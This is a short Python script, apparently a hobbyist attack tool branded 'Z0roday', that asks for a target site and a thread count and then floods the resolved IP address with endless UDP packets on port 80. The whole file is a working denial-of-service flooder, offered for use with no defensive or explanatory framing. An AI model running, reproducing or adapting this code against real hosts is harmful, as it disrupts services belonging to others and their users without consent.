import datetime
from multiprocessing import Process
from os import system, name;
system('clear' if name == 'posix' else'cls')
from time import sleep
import socket
import sys
import _thread
C = '\033[96m'
w='\033[10m'
W='\033[1m'
R = '\033[91m'
O='\033[4m'
Y= '\033[93m'
B= '\033[94m'
G = '\033[92m'
E = '\033[0m'
def printf(str):
    for i in str:
        print(i, end='', flush=True)
        sleep(.03)
printf(f'''
{R}********************************
        {W}I'm Z0roday
{w}********************************
 ''')
sleep(1)	
system('clear')
site = input(f"{R}Please Enter your target yrl: ")
thread_count = int(input("{R}Please Enter your Thread: "))
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'z0roday'
print(R+ "UDP target IP:", ip)
print(Y+ "UDP target port:", UDP_PORT)
sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
